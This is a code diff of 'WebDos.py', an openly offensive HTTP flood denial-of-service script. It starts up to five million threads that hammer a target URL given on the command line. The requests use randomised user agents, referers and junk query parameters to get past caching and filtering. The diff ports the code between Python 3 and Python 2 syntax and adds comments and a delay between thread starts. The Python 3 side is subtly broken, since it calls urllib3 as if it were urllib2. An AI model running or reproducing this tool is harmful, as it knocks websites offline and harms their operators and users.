@@ -1,9 +1,11 @@
-import urllib3
+import urllib2
 import sys
 import threading
 import random
 import re
+import time
 
+#global params
 url=''
 host=''
 headers_useragents=[]
@@ -24,6 +26,7 @@ def set_safe():
 	global safe
 	safe=1
 	
+# generates a user agent array
 def useragent_list():
 	global headers_useragents
 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
@@ -40,6 +43,7 @@ def useragent_list():
 	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
 	return(headers_useragents)
 
+# generates a referer array
 def referer_list():
 	global headers_referers
 	headers_referers.append('http://www.google.com/?q=')
@@ -48,6 +52,7 @@ def referer_list():
 	headers_referers.append('http://' + host + '/')
 	return(headers_referers)
 	
+#builds random ascii string
 def buildblock(size):
 	out_str = ''
 	for i in range(0, size):
@@ -56,12 +61,13 @@ def buildblock(size):
 	return(out_str)
 
 def usage():
-	print('---------------------------------------------------')
-	print('USAGE: python WebDos.py <url>')
-	print('you can add "safe" after url, to autoshut after dos')
-	print('---------------------------------------------------')
+	print '---------------------------------------------------'
+	print 'USAGE: python WebDos.py <url>'
+	print 'you can add "safe" after url, to autoshut after dos'
+	print '---------------------------------------------------'
 
 	
+#http request
 def httpcall(url):
 	useragent_list()
 	referer_list()
@@ -70,7 +76,7 @@ def httpcall(url):
 		param_joiner="&"
 	else:
 		param_joiner="?"
-	request = urllib3.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Cache-Control', 'no-cache')
 	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
@@ -79,19 +85,22 @@ def httpcall(url):
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host',host)
 	try:
-			urllib3.urlopen(request)
-	except urllib3.HTTPError as e:
+			urllib2.urlopen(request)
+	except urllib2.HTTPError, e:
+			#print e.code
 			set_flag(1)
-			print('Sent Request | Status: 500')
+			print 'Request Sent | Status: 500'
 			code=500
-	except urllib3.URLError as e:
+	except urllib2.URLError, e:
 			#print e.reason
 			sys.exit()
 	else:
 			inc_counter()
-			urllib3.urlopen(request)
+			urllib2.urlopen(request)
 	return(code)		
 
+	
+#http caller thread 
 class HTTPThread(threading.Thread):
 	def run(self):
 		try:
@@ -99,19 +108,21 @@ class HTTPThread(threading.Thread):
 				code=httpcall(url)
 				if (code==500) & (safe==1):
 					set_flag(2)
-		except Exception as ex:
+		except Exception, ex:
 			pass
 
+# monitors http threads and counts requests
 class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
 		while flag==0:
-			if (previous+100<request_counter) & (previous != request_counter):
-				print("%d Requests Sent" % (request_counter))
+			if (previous+100<request_counter) & (previous<>request_counter):
+				print "%d Requests Sent" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print("\n-- DOS Attack Finished --")
+			print "\n-- Dos Attack Finished --"
 
+#execute 
 if len(sys.argv) < 2:
 	usage()
 	sys.exit()
@@ -120,7 +131,7 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print("-- DOS Attack Started --")
+		print "-- Dos Attack Started --"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
@@ -130,6 +141,7 @@ else:
 		m = re.search('(https?\://)?([^/]*)/?.*', url)
 		host = m.group(2)
 		for i in range(5000000):
+			time.sleep(0.2)
 			t = HTTPThread()
 			t.start()
 		t = MonitorThread()
